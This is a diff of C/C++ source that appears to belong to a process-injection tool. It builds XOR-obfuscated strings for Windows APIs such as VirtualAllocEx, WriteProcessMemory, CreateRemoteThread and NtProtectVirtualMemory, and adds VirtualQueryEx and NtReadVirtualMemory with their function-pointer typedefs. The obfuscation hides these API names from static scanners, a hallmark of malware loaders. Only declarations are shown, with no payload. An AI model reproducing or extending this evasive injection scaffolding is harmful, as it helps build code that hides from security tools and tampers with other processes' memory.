@@ -34,6 +34,7 @@ const char* kTermPr = "TerminateProcess";
 const char* kResThr = "ResumeThread";
 const char* kDbgPres = "IsDebuggerPresent";
 const char* kFlInstrC = "FlushInstructionCache";
+const char* kVQEx = "VirtualQueryEx";
 */
 
 // Kernel32
@@ -44,6 +45,7 @@ char kGLErr[] = { 'G' ^ XKY, 'e' ^ XKY, 't' ^ XKY, 'L' ^ XKY, 'a' ^ XKY, 's' ^ X
 char kVAlEx[] = { 'V' ^ XKY, 'i' ^ XKY, 'r' ^ XKY, 't' ^ XKY, 'u' ^ XKY, 'a' ^ XKY, 'l' ^ XKY, 'A' ^ XKY, 'l' ^ XKY, 'l' ^ XKY, 'o' ^ XKY, 'c' ^ XKY, 'E' ^ XKY, 'x' ^ XKY, '\0' };
 char kWpm[] = { 'W' ^ XKY, 'r' ^ XKY, 'i' ^ XKY, 't' ^ XKY, 'e' ^ XKY, 'P' ^ XKY, 'r' ^ XKY, 'o' ^ XKY, 'c' ^ XKY, 'e' ^ XKY, 's' ^ XKY, 's' ^ XKY, 'M' ^ XKY, 'e' ^ XKY, 'm' ^ XKY, 'o' ^ XKY, 'r' ^ XKY, 'y' ^ XKY, '\0' };
 char kVFrEx[] = { 'V' ^ XKY, 'i' ^ XKY, 'r' ^ XKY, 't' ^ XKY, 'u' ^ XKY, 'a' ^ XKY, 'l' ^ XKY, 'F' ^ XKY, 'r' ^ XKY, 'e' ^ XKY, 'e' ^ XKY, 'E' ^ XKY, 'x' ^ XKY, '\0' };
+char kVQEx[] = { 'V' ^ XKY, 'i' ^ XKY, 'r' ^ XKY, 't' ^ XKY, 'u' ^ XKY, 'a' ^ XKY, 'l' ^ XKY, 'Q' ^ XKY, 'u' ^ XKY, 'e' ^ XKY, 'r' ^ XKY, 'y' ^ XKY, 'E' ^ XKY, 'x' ^ XKY, '\0' };
 char kCrRemThr[] = { 'C' ^ XKY, 'r' ^ XKY, 'e' ^ XKY, 'a' ^ XKY, 't' ^ XKY, 'e' ^ XKY, 'R' ^ XKY, 'e' ^ XKY, 'm' ^ XKY, 'o' ^ XKY, 't' ^ XKY, 'e' ^ XKY, 'T' ^ XKY, 'h' ^ XKY, 'r' ^ XKY, 'e' ^ XKY, 'a' ^ XKY, 'd' ^ XKY, '\0' };
 char kWSingObj[] = { 'W' ^ XKY, 'a' ^ XKY, 'i' ^ XKY, 't' ^ XKY, 'F' ^ XKY, 'o' ^ XKY, 'r' ^ XKY, 'S' ^ XKY, 'i' ^ XKY, 'n' ^ XKY, 'g' ^ XKY, 'l' ^ XKY, 'e' ^ XKY, 'O' ^ XKY, 'b' ^ XKY, 'j' ^ XKY, 'e' ^ XKY, 'c' ^ XKY, 't' ^ XKY, '\0' };
 char kCrPrA[] = { 'C' ^ XKY, 'r' ^ XKY, 'e' ^ XKY, 'a' ^ XKY, 't' ^ XKY, 'e' ^ XKY, 'P' ^ XKY, 'r' ^ XKY, 'o' ^ XKY, 'c' ^ XKY, 'e' ^ XKY, 's' ^ XKY, 's' ^ XKY, 'A' ^ XKY, '\0' };
@@ -67,6 +69,7 @@ char nNqip[] = { 'N' ^ XKY, 't' ^ XKY, 'Q' ^ XKY, 'u' ^ XKY, 'e' ^ XKY, 'r' ^ XK
 char nUnMvs[] = { 'N' ^ XKY, 't' ^ XKY, 'U' ^ XKY, 'n' ^ XKY, 'm' ^ XKY, 'a' ^ XKY, 'p' ^ XKY, 'V' ^ XKY, 'i' ^ XKY, 'e' ^ XKY, 'w' ^ XKY, 'O' ^ XKY, 'f' ^ XKY, 'S' ^ XKY, 'e' ^ XKY, 'c' ^ XKY, 't' ^ XKY, 'i' ^ XKY, 'o' ^ XKY, 'n' ^ XKY, '\0' };
 char nProcVmem[] = { 'N' ^ XKY, 't' ^ XKY, 'P' ^ XKY, 'r' ^ XKY, 'o' ^ XKY, 't' ^ XKY, 'e' ^ XKY, 'c' ^ XKY, 't' ^ XKY, 'V' ^ XKY, 'i' ^ XKY, 'r' ^ XKY, 't' ^ XKY, 'u' ^ XKY, 'a' ^ XKY, 'l' ^ XKY, 'M' ^ XKY, 'e' ^ XKY, 'm' ^ XKY, 'o' ^ XKY, 'r' ^ XKY, 'y' ^ XKY, '\0' };
 char nWrVMem[] = { 'N' ^ XKY, 't' ^ XKY, 'W' ^ XKY, 'r' ^ XKY, 'i' ^ XKY, 't' ^ XKY, 'e' ^ XKY, 'V' ^ XKY, 'i' ^ XKY, 'r' ^ XKY, 't' ^ XKY, 'u' ^ XKY, 'a' ^ XKY, 'l' ^ XKY, 'M' ^ XKY, 'e' ^ XKY, 'm' ^ XKY, 'o' ^ XKY, 'r' ^ XKY, 'y' ^ XKY, '\0' };
+char nReVMem[] = { 'N' ^ XKY, 't' ^ XKY, 'R' ^ XKY, 'e' ^ XKY, 'a' ^ XKY, 'd' ^ XKY, 'V' ^ XKY, 'i' ^ XKY, 'r' ^ XKY, 't' ^ XKY, 'u' ^ XKY, 'a' ^ XKY, 'l' ^ XKY, 'M' ^ XKY, 'e' ^ XKY, 'm' ^ XKY, 'o' ^ XKY, 'r' ^ XKY, 'y' ^ XKY, '\0' };
 
 // advapi32
 //const char* adv32dl = "advapi32.dll";
@@ -123,6 +126,13 @@ typedef BOOL(__stdcall* pVirtualFreeEx)(
     LPVOID lpAddress,
     SIZE_T dwSize,
     DWORD dwFreeType
+    );
+
+typedef BOOL(__stdcall* pVirtualQueryEx)(
+    HANDLE hProcess,
+    LPCVOID lpAddress,
+    PMEMORY_BASIC_INFORMATION lpBuffer,
+    SIZE_T dwLength
     );
 
 typedef DWORD(__stdcall* pGetLastError)(
@@ -211,6 +221,14 @@ typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(
     PSIZE_T RegionSize,
     ULONG NewProtect,
     PULONG OldProtect
+    );
+
+typedef NTSTATUS(NTAPI* pNtReadVirtualMemory)(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress,
+    PVOID Buffer,
+    SIZE_T NumberOfBytesToRead,
+    PSIZE_T NumberOfBytesReaded
     );
 
 typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
